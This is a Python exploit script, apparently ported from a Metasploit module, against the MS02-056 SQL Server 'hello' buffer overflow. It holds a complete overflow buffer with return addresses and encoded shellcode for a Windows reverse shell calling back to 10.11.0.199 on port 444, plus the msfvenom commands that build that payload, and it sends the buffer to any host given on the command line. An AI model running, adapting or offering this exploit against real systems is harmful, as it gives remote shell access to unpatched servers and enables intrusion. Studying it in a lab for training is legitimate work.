#!/usr/bin/python
# original file: /usr/share/metasploit-framework/modules/exploits/windows/mssql/ms02_056_hello.rb
import sys
import socket

host = sys.argv[1]		# Recieve IP from user
port = int(sys.argv[2])	

#
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.199 LPORT=444 EXITFUNC=process -a x86 --platform Windows -f raw -o payload
# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
# cat stackadj payload > shellcode
# cat shellcode | msfvenom -a x86 --platform Windows -b '\x00' -e x86/shikata_ga_nai -f python -v reverse_shell

reverse_shell =  ""
reverse_shell += "\xda\xcd\xba\x5c\xe8\x2d\xe2\xd9\x74\x24\xf4"
reverse_shell += "\x5e\x31\xc9\xb1\x53\x31\x56\x19\x83\xee\xfc"
reverse_shell += "\x03\x56\x15\xbe\x1d\xac\x0e\x92\xd3\xaf\xce"
reverse_shell += "\x16\x03\x2d\xce\xe6\xd4\x52\x46\x03\xe5\x52"
reverse_shell += "\x3c\x40\x56\x63\x36\x04\x5b\x08\x1a\xbc\xe8"
reverse_shell += "\x7c\xb3\xb3\x59\xca\xe5\xfa\x5a\x67\xd5\x9d"
reverse_shell += "\xd8\x7a\x0a\x7d\xe0\xb4\x5f\x7c\x25\xa8\x92"
reverse_shell += "\x2c\xfe\xa6\x01\xc0\x8b\xf3\x99\x6b\xc7\x12"
reverse_shell += "\x9a\x88\x90\x15\x8b\x1f\xaa\x4f\x0b\x9e\x7f"
reverse_shell += "\xe4\x02\xb8\x9c\xc1\xdd\x33\x56\xbd\xdf\x95"
reverse_shell += "\xa6\x3e\x73\xd8\x06\xcd\x8d\x1d\xa0\x2e\xf8"
reverse_shell += "\x57\xd2\xd3\xfb\xac\xa8\x0f\x89\x36\x0a\xdb"
reverse_shell += "\x29\x92\xaa\x08\xaf\x51\xa0\xe5\xbb\x3d\xa5"
reverse_shell += "\xf8\x68\x36\xd1\x71\x8f\x98\x53\xc1\xb4\x3c"
reverse_shell += "\x3f\x91\xd5\x65\xe5\x74\xe9\x75\x46\x28\x4f"
reverse_shell += "\xfe\x6b\x3d\xe2\x5d\xe4\xf2\xcf\x5d\xf4\x9c"
reverse_shell += "\x58\x2e\xc6\x03\xf3\xb8\x6a\xcb\xdd\x3f\x8c"
reverse_shell += "\xe6\x9a\xaf\x73\x09\xdb\xe6\xb7\x5d\x8b\x90"
reverse_shell += "\x1e\xde\x40\x60\x9e\x0b\xc6\x30\x30\xe4\xa7"
reverse_shell += "\xe0\xf0\x54\x40\xea\xfe\x8b\x70\x15\xd5\xa3"
reverse_shell += "\x1b\xec\xbe\xc1\xd0\xee\xf9\xbe\xe4\xee\x04"
reverse_shell += "\x83\x60\x08\x6c\xeb\x24\x83\x19\x92\x6c\x5f"
reverse_shell += "\xbb\x5b\xbb\x1a\xfb\xd0\x48\xdb\xb2\x10\x24"
reverse_shell += "\xcf\x23\xd1\x73\xad\xe2\xee\xa9\xd9\x69\x7c"
reverse_shell += "\x36\x19\xe7\x9d\xe1\x4e\xa0\x50\xf8\x1a\x5c"
reverse_shell += "\xca\x52\x38\x9d\x8a\x9d\xf8\x7a\x6f\x23\x01"
reverse_shell += "\x0e\xcb\x07\x11\xd6\xd4\x03\x45\x86\x82\xdd"
reverse_shell += "\x33\x60\x7d\xac\xed\x3a\xd2\x66\x79\xba\x18"
reverse_shell += "\xb9\xff\xc3\x74\x4f\x1f\x75\x21\x16\x20\xba"
reverse_shell += "\xa5\x9e\x59\xa6\x55\x60\xb0\x62\x65\x2b\x98"
reverse_shell += "\xc3\xee\xf2\x49\x56\x73\x05\xa4\x95\x8a\x86"
reverse_shell += "\x4c\x66\x69\x96\x25\x63\x35\x10\xd6\x19\x26"
reverse_shell += "\xf5\xd8\x8e\x47\xdc"
reverse_shell += "\x90" * (512-357)


buffer= "\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b"
buffer+= "\x00\x01\x02\x00\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x02"
buffer+= "\x10\x00\x00\x00"
buffer+= "\xaa" * 528
buffer+= "\x1B\xA5\xEE\x34"
buffer+= "\xaa" * 4
buffer+= "\xba\x8a\xb6\x42"
buffer+= "\x50\x1e\xd0\x42\x50\x1e\xd0\x42"
buffer+= "3333"
buffer+= "\x50\x1e\xd0\x42\x50\x1e\xd0\x42"
buffer+= "\xaa" * 88
buffer+= reverse_shell
buffer+= "\x00\x24\x01\x00\x00"

try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
	print "sending the exploit.."
	client.connect((host, port))
    	client.send(buffer)
	print "exploit sent!"
except:
	print "\nCould not connect to " + host + ":" + str(port) + "!"



#buf = 
#    rand_text_english(528, payload_badchars) +
#    "\x1B\xA5\xEE\x34" +
#    rand_text_english(4, payload_badchars) +
#    [ target['Rets'][0] ].pack('V') +                       # 0x42b68aba
#    [ target['Rets'][1], target['Rets'][1] ].pack('VV') +   # 0x42d01e50
#    '3333' +
#    [ target['Rets'][1], target['Rets'][1] ].pack('VV') +
#    rand_text_english(88, payload_badchars) +
#    payload.encoded +
#    "\x00\x24\x01\x00\x00"

#sock.put(buf)
